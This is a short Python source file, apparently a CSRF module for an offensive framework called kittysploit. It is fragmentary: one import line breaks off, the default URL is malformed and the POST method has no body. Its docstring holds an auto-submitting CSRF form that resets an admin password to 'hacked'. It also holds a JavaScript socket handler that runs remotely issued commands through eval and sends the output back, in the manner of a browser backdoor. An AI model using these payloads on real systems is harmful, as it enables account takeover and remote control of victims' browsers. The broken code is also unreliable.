from kittysploit.core.framework.base_module import BaseModule
from kittysploit.core.framework.option import OptString
from kittysploit.core.lib.

class Csrf(BaseModule):
    
    url = OptString("http://127.0.1", "URL to perform CSRF", required=True)
    path = OptString("/", "Path to perform CSRF", required=True)
        
    def csrf_get(self, params):
        # send csrf get request
        data = self.url  + self.path + "?" + params
        return data
    
    def csrf_post(self, params: dict):
        # parse dict
        # exemple:
        """
        <form action="http://localhost:8000/api/set-password" method="POST">
            <input name='userOwner' value='built&#45;in' type='hidden'>
            <input name='userName' value='admin' type='hidden'>
            <input name='newPassword' value='hacked' type='hidden'>
            <input type=submit>
        </form>
        <script>
            history.pushState('', '', '/');
            document.forms[0].submit();
        </script>
        receive code in 
            mysocket.on('issue_task', function(msg) {
            console.log(msg);
            console.log("Commande recue");
            id = msg['task_id'];
            console.log(msg['input']);
            try {
                var cmdout = eval(String(msg['input'])); //do the task
                if (String(msg['input']).includes('sendOutput') == false) {
                    sendOutput(id, cmdout, type=msg['type']);
                }
            } catch (err) {
                sendOutput(id, err, type=msg['type']);
            }
        });
    """

        